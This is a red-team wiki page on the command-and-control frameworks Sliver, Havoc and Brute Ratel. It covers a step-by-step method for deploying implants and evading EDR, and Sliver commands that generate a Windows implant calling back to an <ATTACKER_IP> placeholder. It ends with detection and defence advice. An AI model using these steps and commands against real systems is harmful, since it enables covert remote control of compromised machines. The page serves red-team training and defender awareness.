---
title: "Modern C2 Frameworks (Sliver, Havoc, Brute Ratel)"
type: technique
tags: [red-team, c2, post-exploitation, evasion]
phase: post-exploitation
date_created: 2026-06-17
date_updated: 2026-06-17
sources: [sliver-github, havoc-github]
---

# Modern C2 Frameworks (Sliver, Havoc, Brute Ratel)

## What it is
Command-and-control frameworks beyond Cobalt Strike that became common in 2024-2026 red-team and adversary tradecraft. Sliver (open-source, BishopFox), Havoc (open-source, C5pider), and Brute Ratel C4 (commercial) provide implants, malleable transports, and post-exploitation tooling with strong evasion defaults.

## How it works
Each runs a team server plus generated implants. They use pluggable transports (HTTP(S), DNS, mTLS, and WireGuard for Sliver; HTTP/SMB for Havoc), encrypted comms, and in-memory or BOF execution to minimise disk artefacts. They aim to defeat EDR via sleep-mask and stack-spoofing (Havoc, Brute Ratel) and per-build obfuscation.

## Attack phases
Post-exploitation, C2, lateral movement, and persistence.

## Prerequisites
- Initial code execution on a target (see [[initial-access]], [[clickfix]], [[html-smuggling]]).
- Infrastructure for the team server and redirectors (see [[opsec]]).

## Methodology
1. Stand up the team server; configure listeners and redirectors.
2. Generate an implant with the appropriate transport and evasion options.
3. Deliver via your initial-access vector; establish the session.
4. Post-exploitation: token and credential ops, BOFs, lateral movement, pivoting (see [[network-pivoting-techniques]]).
5. Maintain opsec: jittered sleep, domain fronting or redirectors, and masked in-memory footprint.

## Key payloads / examples
Sliver (BishopFox):
```bash
# server
sliver-server
# generate an mTLS implant
sliver > generate --mtls <ATTACKER_IP> --os windows --arch amd64 --save /tmp
# start listener, interact
sliver > mtls
sliver > use <session>
```
Havoc (C5pider): build the team server, configure an HTTP/SMB listener in the GUI, generate a demon, then operate (`shell`, `dotnet inline-execute`, BOFs).
Brute Ratel C4: commercial; badger implants with built-in EDR evasion (sleep obfuscation, stack spoofing).

## Bypasses and variants
- Sleep-mask and stack-spoofing to evade memory scanning (Havoc, Brute Ratel).
- Custom C2 profiles and malleable transports plus redirectors to blend with normal traffic.
- DNS or WireGuard transports for egress-restricted networks (Sliver).

## Detection and defence
- Hunt known default JA3/JARM and HTTP profiles; behavioural detection of beaconing (jitter analysis).
- Memory scanning for unbacked executable regions; detect sleep-mask patterns.
- Egress filtering, TLS inspection, and DNS monitoring; see [[endpoint-detection-and-response]] and [[elastic-edr]].

## Tools
[[cobalt-strike]] and [[mythic-c2]] (related C2 pages). Sliver, Havoc, and Brute Ratel as above.

## Sources
- BishopFox/sliver (GitHub) (slug: sliver-github).
- HavocFramework/Havoc (GitHub) (slug: havoc-github).
